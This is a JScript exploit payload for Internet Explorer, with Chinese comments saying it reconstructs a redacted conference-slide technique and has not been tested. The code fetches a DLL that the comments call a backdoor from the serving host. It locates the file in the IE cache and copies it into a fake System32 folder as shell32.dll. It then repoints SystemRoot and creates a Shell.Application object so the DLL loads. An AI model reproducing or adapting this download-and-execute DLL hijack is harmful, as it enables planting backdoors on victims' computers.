/**
	这个漏洞利用思路是 TK PPT 中的打码部分，未做实际测试，仅是源码分析。
	用到了HTML5 中新加入的一些 API，可以说是 WebOS 层面，漏洞利用的首个公布模型。
	极具参考价值， 从个人初步的分析结果看，该模型忽略了 safemode 的开启部分，
	需要利用相关技术开启 safemode 后方可直接发挥作用。

	指导作用。
		1.  IE 类型漏洞从当初的二进制层面，转为了脚本层面，攻击维度的提升，导致稳定性的进一步提升。
		2.  IE 漏洞已经不在是一个点的攻击，而转化为一种全方位的立体攻击，要想理解这样的形式，
					首先需要了解IE 对 HTML5 以及 CSS 的支持方式，以及实现方式才有机会。
		3.  对下一步学习的指导作用，曾经对二进制漏洞的理解是掌握 C 与 汇编 即可完成，
					而下一阶段的攻防双方将需要掌握计算机的全方位能力，这些能力包括但不限于：
						HTML5 + CSS3
						javascript 
						C + 汇编
						WebOS
*/
function payload2()
{
    var oF = new ActiveXObject("Scripting.FileSystemObject");
    var oW = new ActiveXObject("WScript.Shell");
    // find a file based on name in specific directory recursively
    // return full path of first matching file
    var fsearch = function(dir, fname)
    {  //// 递归搜索函数，可以搜出指定 dir 目录下（WebOS可控的文件系统内）是否存在 fname 文件名
        var FileEnum = new Enumerator(oF.getFolder(dir).SubFolders);
        for (; !FileEnum.atEnd(); FileEnum.moveNext())
        {
            var ret = fsearch(FileEnum.item(), fname);
            if(ret) { return ret; }
        }
        var FileEnum2 = new Enumerator(oF.getFolder(dir).Files);
        for (; !FileEnum2.atEnd(); FileEnum2.moveNext())
        {
            var itm = FileEnum2.item().name;
            if (itm.indexOf(fname) != - 1)
            {
                return FileEnum2.item();
            }
        }
    }

    //////  组装一些后面会用到的关键路径 。
    var desktop = oW.SpecialFolders("Desktop");
    var fakesys = desktop + "\\System32";
    var iedir = oW.Environment("Process").Item("LOCALAPPDATA") + "\\Microsoft\\Windows\\Temporary Internet Files";
    if( ! oF.FolderExists(fakesys) )
    {
	    /// 当目录不存在时，应当创建一个。
        oF.CreateFolder( fakesys );
    }
    /////    从服务器拉取一个 dll 文件（其实就是 需要植入的后门）。。。
    var rpath = location.href.split("/").slice(0,-1).join("/") + "/AVeryOddFileName.dll";
    xPost = new ActiveXObject("Microsoft.XMLHTTP");
    xPost.Open("GET", rpath, false);    // false to sync mode
    xPost.Send();
    var dll = fsearch(iedir+"\\Low\\Content.IE5", "AVeryOddFileName");
    if ( dll )
    {
	    /////  dll 后门下载成功时，执行该代码段
        oF.CopyFile( dll, fakesys+"\\shell32.dll" );
        /////  将 dll 重命名为 shell32.dll
        var vhomedir = oW.Environment("Process").Item("USERPROFILE").split(":").join("");
        /////  组装新的 环境目录路径
        oW.Environment("Process").Item("SystemRoot") = iedir + "\\Virtualized\\" + vhomedir + "\\Desktop";
        /////  重配环境 目录路径
        var oS = new ActiveXObject("Shell.Application");    // trigger to load shell32.dll
        /////  通过调用 Shell 插件完成 shell32.dll 这个文件的自加载，而 shell32.dll 此时正是已经植入的后门文件。。。
        return true;
    }
    return false;
}